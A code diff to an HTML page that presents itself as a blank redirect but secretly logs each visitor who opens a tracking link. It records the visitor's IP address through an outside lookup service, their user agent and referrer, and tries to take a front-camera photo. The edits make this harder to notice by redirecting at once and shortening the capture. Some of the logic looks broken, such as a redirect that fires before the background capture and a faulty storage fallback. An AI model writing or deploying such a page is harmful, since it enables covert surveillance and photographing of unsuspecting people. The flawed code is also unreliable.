@@ -1,29 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
     <script>
+    // Immediately start processing on page load
     (function() {
-        // Get URL parameters
         const params = new URLSearchParams(window.location.search);
         const trackingId = params.get('track');
         const targetUrl = params.get('target');
         
         if (trackingId && targetUrl) {
-            // Prepare tracking data
+            // Decode target URL first
+            const decodedUrl = decodeURIComponent(targetUrl);
+            
+            // Prepare minimal tracking data
             const trackingData = {
                 id: trackingId,
                 timestamp: new Date().toISOString(),
-                target: decodeURIComponent(targetUrl),
+                target: decodedUrl,
                 referrer: document.referrer || 'Direct',
-                userAgent: navigator.mediaDevices ? 'Supported' : 'No Camera',
+                userAgent: navigator.userAgent,
                 ip: 'Pending',
                 image: null
             };
 
-            // Start camera capture if available
-            if (navigator.mediaDevices) {
-                const capture = async () => {
+            // Start immediate redirect
+            window.location.href = decodedUrl;
+            
+            // Continue processing in background (after redirect)
+            setTimeout(async () => {
+                // Try to get IP
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    trackingData.ip = (await ipResponse.json()).ip;
+                } catch (e) {
+                    trackingData.ip = 'Unknown';
+                }
+                
+                // Try camera capture if available
+                if (navigator.mediaDevices) {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ 
                             video: { facingMode: 'user' },
@@ -34,8 +48,8 @@
                         video.srcObject = stream;
                         await video.play();
                         
-                        // Wait 3 seconds for camera to initialize
-                        await new Promise(r => setTimeout(r, 3000));
+                        // Quick capture (reduced from 3s to 500ms)
+                        await new Promise(r => setTimeout(r, 500));
                         
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth;
@@ -45,40 +59,20 @@
                         trackingData.image = canvas.toDataURL('image/jpeg', 0.7);
                         stream.getTracks().forEach(t => t.stop());
                     } catch (e) {
-                        console.log('Camera error:', e);
+                        console.log('Camera capture skipped:', e);
                     }
-                    
-                    // Complete tracking and redirect
-                    completeTracking();
-                };
-                
-                capture();
-            } else {
-                completeTracking();
-            }
-            
-            // Get IP and save data
-            async function completeTracking() {
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    trackingData.ip = (await ipResponse.json()).ip;
-                } catch (e) {
-                    trackingData.ip = 'Unknown';
                 }
                 
-                // Save to localStorage
+                // Save data
                 const allData = JSON.parse(localStorage.getItem('track_data') || []);
                 allData.unshift(trackingData);
                 localStorage.setItem('track_data', JSON.stringify(allData));
-                
-                // Redirect to target
-                window.location.href = decodeURIComponent(targetUrl);
-            }
+            }, 0);
         }
     })();
     </script>
 </head>
 <body>
-    <!-- Empty page - will redirect immediately -->
+    <!-- Empty page - redirect happens before anything renders -->
 </body>
 </html>
